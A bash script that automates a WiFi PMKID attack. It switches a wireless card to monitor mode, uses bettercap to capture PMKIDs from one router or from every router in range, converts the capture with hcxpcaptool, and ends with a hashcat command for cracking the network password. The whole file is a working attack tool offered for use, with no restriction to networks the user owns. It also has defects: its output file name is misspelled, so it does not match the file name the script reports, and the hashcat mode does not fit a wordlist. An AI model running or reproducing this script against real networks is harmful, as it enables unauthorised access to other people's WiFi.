#!/bin/bash

#######################################################################
#                                                                     #
#  Name:        wifi_pmkid                                            #
#                                                                     #
#  Author:      D4LL45                                                #
#  Version:     1.0.0                                                 #
#  Date:        16.08.2022                                            #
#                                                                     #
#  Description: Use this script to catch a pmkid handshake for a      #
#               specific router. It uses bettercap and hashcat        #
#                                                                     #
#  Parameter:   none                                                  #
#                                                                     #
#  Usage: 	sudo wifi_pmkid (root required)                       #
#                                                                     #
#######################################################################


if [[ $(id -u) -ne 0 ]]; then
	echo "Come on, you need to be root!";
	exit 1;
fi

mkdir /tmp/wifi_pmkid
echo "Command:  airmon-ng   -> looking for your connected wifi devices"
airmon-ng > /tmp/wifi_pmkid/interfaces.txt
echo ""

echo "Select your wifi device for monitoring mode:"
ifacepath="/tmp/wifi_pmkid/interfaces.txt"
c=0
ifaces[0]=""
while IFS= read -r line
do
	if [[ $line == *"phy"* ]]; then
		ifaces[c]="$(cut -d$'\t' -f2 <<<$line)"
		((c++))
	fi
done < "$ifacepath"
c=0
for i in "${ifaces[@]}"
do
	echo "$c) $i"
	((c++))
done
read -n 1 -p "Device Selection:" usrinput
echo ""
echo "Selected device is ${ifaces[$usrinput]}."
usriface=${ifaces[$usrinput]}
echo ""

echo "Command: ip link set $usriface down; iw dev $usriface set type monitor; rfkill unblock all; ip link set $usriface up   -> setting your wifi device to monitoring mode"
ip link set $usriface down
iw dev $usriface set type monitor
rfkill unblock all
ip link set $usriface up

echo "Command:  bettercap -iface $usriface -caplet /root/commands.cap   -> starting bettercap for capturing PMKIDs"
echo "Use wifi.assoc * for capturing PMKIDs on all routers or wifi.assoc MAC for capturing a specific PMKID."
echo "When finished capturing, quit bettercap to go on..."
sleep 3
bettercap -iface $usriface -caplet /root/commands.cap

echo ""
echo "Type in the directory to store the *.pmkid file containing the handshake:"
read -p "Directory:" dirinput
mkdir $dirinput
echo ""

echo "Command: hcxpcaptool -z $dirinput/captured_pmkids.pmkid /root/bettercap-wifi-handshakes.pcap   -> converting the PMKID data from pcap to 16800-hashcat format."
hcxpcaptool -z $dirinput/capruted_pmkids.pmkid /root/bettercap-wifi-handshakes.pcap
rm /root/bettercap-wifi-handshakes.pcap

echo ""
echo "Last thing to do is cracking thr password from capruted_pmkids.pmkid with hashcat by using:"
echo "hashcat -m16800 -a3 -w3 captured_pmkids.pmkid wordlist.txt"
echo ""
echo "That's it... xD"
